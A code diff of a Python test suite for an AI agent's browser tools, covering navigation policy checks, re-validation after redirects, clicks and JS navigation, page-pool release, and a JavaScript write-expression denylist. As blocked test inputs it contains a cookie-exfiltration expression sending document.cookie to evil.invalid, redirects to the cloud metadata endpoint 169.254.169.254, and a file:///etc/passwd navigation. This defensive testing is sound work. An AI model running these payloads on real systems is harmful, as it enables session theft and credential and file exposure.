@@ -1,13 +1,16 @@
 """T4 接线单测：AppToolExecutor 的 6 个 Tier3 浏览器工具。
 
-覆盖三条主线：**policy 门**（navigate 之前把关、拒绝路径绝不建页/导航）、
-**当前页跟踪**（open 复用同一个 page；snapshot/click/type/scroll 都作用在它身上）、
+覆盖主线：**policy 门**（navigate 之前把关、拒绝路径绝不建页/导航）、**动作后 URL 复查**
+（重定向/点击跳转/JS 跳转回流后的落点也要在策略内，I2）、**当前页跟踪**（open 复用同一个 page；
+snapshot/click/type/scroll 都作用在它身上；池回收后的恢复与 ``aclose()`` 释放，I3）、
 **结构化降级**（未注入池 / 池未启动 / 快照为空 / 动作失败 一律返回 ToolResult，绝不抛）。
 
 不启真实浏览器（教训 §1）：FakeBrowser / FakePage 双人舞——page 的 ``calls`` 保留跨方法
 的时间顺序（用来 pin "先 aria-ref 定位再 click"、"type 先清空再填"），失败可编程
-（goto / networkidle 等待 / snapshot / click / JS 回退 / evaluate）；FakeBrowser 只实现
-executor 用到的 ``new_page()``，并记录建页次数（当前页复用与并发串行化的证据）。
+（goto / networkidle 等待 / snapshot / click / JS 回退 / evaluate），跳转可编程
+（``redirect_url`` / ``click_url`` / ``evaluate_url``，动作后复查的测试缝），
+``closed`` 可以模拟池回收；FakeBrowser 实现 executor 用到的 ``new_page()`` / ``release()``，
+并记录建页次数与归还（当前页复用、隔离、释放的证据）。
 真浏览器冒烟是 T6 的独立脚本，不入 pytest。
 """
 
@@ -62,6 +65,8 @@ class FakeLocator:
 
     async def click(self, *, timeout: float | None = None) -> None:
         self._page.calls.append(("click", self.selector))
+        if self._page.click_url is not None:  # 点链接/弹窗跳转（动作后 URL 复查的测试缝）
+            self._page.url = self._page.click_url
         if self._page.fail_click:
             raise PlaywrightTimeoutError(f"click timeout: {self.selector}")
 
@@ -101,6 +106,10 @@ class FakePage:
         self.js_result = js_result
         self.calls: list[tuple] = []
         self.goto_calls: list[str] = []
+        self.closed = False  # 池回收（dispose → close）后为 True
+        self.redirect_url: str | None = None  # goto 跟随重定向后的最终 URL
+        self.click_url: str | None = None  # 点击链接/弹窗后的 URL
+        self.evaluate_url: str | None = None  # JS 跳转后的 URL
         self.fail_goto = False
         self.fail_networkidle_wait = False
         self.fail_snapshot = False
@@ -114,8 +123,11 @@ class FakePage:
         self.calls.append(("goto", url, wait_until))
         if self.fail_goto:
             raise RuntimeError("net::ERR_NAME_NOT_RESOLVED")
-        self.url = url
+        self.url = self.redirect_url if self.redirect_url is not None else url
         return FakeResponse()
+
+    def is_closed(self) -> bool:
+        return self.closed
 
     async def wait_for_load_state(self, state: str | None = None, *, timeout: float | None = None):
         self.calls.append(("wait_for_load_state", state))
@@ -134,17 +146,20 @@ class FakePage:
         self.calls.append(("evaluate", expression))
         if self.fail_evaluate:
             raise RuntimeError("Evaluation failed: ReferenceError")
+        if self.evaluate_url is not None:  # JS 跳转（静态黑名单漏网时的兜底测试缝）
+            self.url = self.evaluate_url
         return self.js_result
 
 
 class FakeBrowser:
-    """BrowserPool 替身：只实现 executor 用到的 new_page()；可注入启动失败。"""
+    """BrowserPool 替身：只实现 executor 用到的 new_page()/release()；可注入启动失败。"""
 
     def __init__(self, page: FakePage | None = None, *, start_error: Exception | None = None):
         self._page = page
         self.start_error = start_error
         self.created: list[FakePage] = []
         self.new_page_calls = 0
+        self.released: list[FakePage] = []
 
     async def start(self) -> None:  # pragma: no cover - 池生命周期由 app 接线负责
         pass
@@ -152,14 +167,18 @@ class FakeBrowser:
     async def close(self) -> None:  # pragma: no cover
         pass
 
+    async def release(self, page: FakePage) -> None:
+        self.released.append(page)
+
     async def new_page(self) -> FakePage:
         self.new_page_calls += 1
         await asyncio.sleep(0)  # 真实建页有 await 点：并发测试需要这个让出点
         if self.start_error is not None:
             raise self.start_error
-        page = self._page if self._page is not None else FakePage()
-        self.created.append(page)
-        return page
+        if self._page is None or self._page.is_closed():
+            self._page = FakePage()  # 池回收后是新建/复用 idle（不会把死页再交出去）
+        self.created.append(self._page)
+        return self._page
 
 
 # ── executor 骨架（Tier1/2 服务只是占位：本文件只测 Tier3 接线） ────────────────
@@ -203,6 +222,17 @@ async def test_browser_tools_listed_with_parameters():
     assert tools["browser_scroll"].parameters == {"direction": "string"}
     assert tools["browser_execute_js"].parameters == {"expression": "string"}
     assert all(tools[name].description for name in BROWSER_TOOLS)
+
+
+@pytest.mark.asyncio
+async def test_click_and_type_specs_document_the_target_alias():
+    """M-a：spec 只广告 ``ref``，而 agent 层（BrowserParams）发的是 ``target``——
+
+    两个名字 executor 都收（:func:`_arg` 宽容别名），但模型需要从 spec 里知道这一点。
+    """
+    tools = {t.name: t for t in await make_executor(FakeBrowser()).list_tools()}
+    assert "target" in tools["browser_click"].description
+    assert "target" in tools["browser_type"].description
 
 
 @pytest.mark.asyncio
@@ -362,6 +392,53 @@ async def test_concurrent_opens_share_one_page():
     assert browser.created[0].goto_calls == ["https://example.com/a", "https://example.com/b"]
 
 
+@pytest.mark.asyncio
+async def test_closed_current_page_is_reacquired_on_next_open():
+    """I3：池到上限会回收最老的 busy page（dispose → close）——死页不能再当当前页。
+
+    不检查的话 ``self._page`` 永远指向死页：之后每个浏览器调用都失败、无法恢复，
+    而且那个池槽也永远不释放。
+    """
+    page = FakePage()
+    browser = FakeBrowser(page)
+    ex = make_executor(browser)
+    await ex.call("browser_open", {"url": "https://example.com/a"})
+    page.closed = True  # 池回收
+    assert (await ex.call("browser_snapshot", {})).error_type == "no_open_page"
+    result = await ex.call("browser_open", {"url": "https://example.com/b"})
+    assert result.status == "success"
+    assert browser.new_page_calls == 2  # 重新取页（而不是复用死页）
+    fresh = browser.created[-1]
+    assert fresh is not page
+    assert fresh.goto_calls == ["https://example.com/b"]
+
+
+@pytest.mark.asyncio
+async def test_aclose_releases_current_page_back_to_pool():
+    """I3：显式释放——不回池的话一个池槽被永久占住（max_pages=3 时三个会话就占满）。"""
+    page = FakePage()
+    browser = FakeBrowser(page)
+    ex = make_executor(browser)
+    await ex.call("browser_open", {"url": "https://example.com/"})
+    await ex.aclose()
+    assert browser.released == [page]
+    assert (await ex.call("browser_snapshot", {})).error_type == "no_open_page"
+    await ex.aclose()  # 幂等：没有当前页时不重复归还
+    assert browser.released == [page]
+
+
+@pytest.mark.asyncio
+async def test_aclose_does_not_return_a_dead_page_to_the_pool():
+    """已关闭的页面不入 idle：``new_page()`` 会原样取出 idle，放死页等于把故障传染给下一个调用者。"""
+    page = FakePage()
+    browser = FakeBrowser(page)
+    ex = make_executor(browser)
+    await ex.call("browser_open", {"url": "https://example.com/"})
+    page.closed = True
+    await ex.aclose()
+    assert browser.released == []
+
+
 # ── snapshot ────────────────────────────────────────────────────────────────
 
 
@@ -385,9 +462,27 @@ async def test_snapshot_returns_refs_for_click():
     result = await ex.call("browser_snapshot", {})
     assert result.status == "success"
     assert "[ref=e2]" in result.content
-    assert result.data["refs"] == result.content
+    assert result.data["refs"] in result.content  # refs 原样保留（后面 click 要用）
     assert result.data["url"] == "https://example.com/"
     assert ("aria_snapshot", "body", "ai") in page.calls  # mode="ai" 是唯一产出 ref 的模式
+
+
+@pytest.mark.asyncio
+async def test_snapshot_marks_itself_observation_only():
+    """M-b：快照是“看见了什么”，不是“做了什么”——答案模型不能由此推断发生过交互。
+
+    答案节点只读 ``result_data``（graph.py 的 answer），所以标注要进 ``data``；
+    ``content`` 同步带上，保持两个面一致。
+    """
+    page = FakePage()
+    browser = FakeBrowser(page)
+    ex = make_executor(browser)
+    await ex.call("browser_open", {"url": "https://example.com/"})
+    result = await ex.call("browser_snapshot", {})
+    assert result.status == "success"
+    assert "仅观察" in result.content
+    assert "仅观察" in result.data["note"]
+    assert "未执行交互" in result.data["note"]
 
 
 @pytest.mark.asyncio
@@ -526,6 +621,76 @@ async def test_scroll_defaults_to_down_and_honours_direction_amount():
     assert bad.error_type == "invalid_direction"
 
 
+# ── I2：动作后导航复查（点击/JS/重定向绕不过策略门） ──────────────────────────
+
+
+@pytest.mark.asyncio
+async def test_browser_open_revalidates_the_post_redirect_url():
+    """goto 会跟随重定向：入参可能合法，最终落点却在策略外（云元数据端点）。"""
+    page = FakePage()
+    page.redirect_url = "http://169.254.169.254/latest/meta-data/"
+    browser = FakeBrowser(page)
+    ex = make_executor(browser)
+    result = await ex.call("browser_open", {"url": "https://example.com/r"})
+    assert result.status == "error"
+    assert result.error_type == "navigation_blocked"
+    assert "private_address_blocked" in result.error_message
+    assert result.data["reason"].startswith("private_address_blocked")
+    assert result.data["action"] == "browser_open"
+    assert page.goto_calls == ["https://example.com/r"]  # 入参确实过了门（拦的是落点）
+    # 违规页被隔离：后续调用不会继续在它上面动作
+    assert (await ex.call("browser_snapshot", {})).error_type == "no_open_page"
+    assert browser.released == [page]
+
+
+@pytest.mark.asyncio
+async def test_browser_click_navigation_is_revalidated():
+    """点击链接/弹窗可以把页面带去任何地方（T2 实证：actions 自身不设防，能开 file://）。"""
+    page = FakePage()
+    page.click_url = "file:///etc/passwd"
+    browser = FakeBrowser(page)
+    ex = make_executor(browser)
+    await ex.call("browser_open", {"url": "https://example.com/"})
+    result = await ex.call("browser_click", {"ref": "e2"})
+    assert result.status == "error"
+    assert result.error_type == "navigation_blocked"
+    assert "protocol_blocked" in result.error_message
+    assert result.data["action"] == "browser_click"
+    assert (await ex.call("browser_snapshot", {})).error_type == "no_open_page"
+    assert browser.released == [page]
+
+
+@pytest.mark.asyncio
+async def test_browser_click_same_domain_navigation_still_succeeds():
+    """负对照：点击后的同域跳转（合法）照常成功，且不触发隔离。"""
+    page = FakePage()
+    page.click_url = "https://example.com/next"
+    browser = FakeBrowser(page)
+    ex = make_executor(browser)
+    await ex.call("browser_open", {"url": "https://example.com/"})
+    result = await ex.call("browser_click", {"ref": "e2"})
+    assert result.status == "success"
+    assert result.data["url"] == "https://example.com/next"
+    assert browser.released == []
+    assert (await ex.call("browser_snapshot", {})).status == "success"
+
+
+@pytest.mark.asyncio
+async def test_execute_js_navigation_is_revalidated_when_the_denylist_misses():
+    """静态黑名单是 best-effort（不是沙箱）：漏网的表达式真把页面带出去时，动作后复查兜底。"""
+    page = FakePage()
+    page.evaluate_url = "http://169.254.169.254/latest/meta-data/"
+    browser = FakeBrowser(page)
+    ex = make_executor(browser)
+    await ex.call("browser_open", {"url": "https://example.com/"})
+    result = await ex.call("browser_execute_js", {"expression": "document.title"})
+    assert result.status == "error"
+    assert result.error_type == "navigation_blocked"
+    assert "private_address_blocked" in result.error_message
+    assert result.data["action"] == "browser_execute_js"
+    assert (await ex.call("browser_snapshot", {})).error_type == "no_open_page"
+
+
 # ── execute_js（只读 + 截断） ────────────────────────────────────────────────
 
 
@@ -565,6 +730,13 @@ async def test_execute_js_allows_read_only_extraction(expression):
         "eval('1+1')",
         "new Function('return 1')()",
         "navigator.clipboard.writeText('x')",
+        # I2 评审探针：旧黑名单漏掉的写法
+        "location.assign('https://evil.example/')",
+        "location.replace('/next')",
+        "document.forms[0].requestSubmit()",
+        "document.body.textContent='x'",
+        "new Image().src='http://evil.invalid/?c='+document.cookie",
+        "window['fetch']('/api/delete')",
     ],
 )
 async def test_execute_js_blocks_write_expressions(expression):
@@ -592,6 +764,23 @@ async def test_execute_js_rejects_missing_or_non_str_expression():
         assert result.status == "error"
         assert result.error_type == "invalid_expression"
     assert not [call for call in page.calls if call[0] == "evaluate"]
+
+
+@pytest.mark.asyncio
+async def test_execute_js_allows_read_only_string_replace():
+    """命名决策：黑名单只拦 ``location.assign/replace``，不连坐字符串的 ``.replace(...)``。
+
+    只读提取里 ``document.body.innerText.replace(...)`` 是常用写法；用“点号开头的
+    assign/replace 调用”一刀切会把正常提取也拒了（``arr.join('').replace(…)`` 这类链式调用同理）。
+    """
+    page = FakePage()
+    browser = FakeBrowser(page)
+    ex = make_executor(browser)
+    await ex.call("browser_open", {"url": "https://example.com/"})
+    result = await ex.call(
+        "browser_execute_js", {"expression": "document.body.innerText.replace('a', 'b')"}
+    )
+    assert result.status == "success"
 
 
 @pytest.mark.asyncio
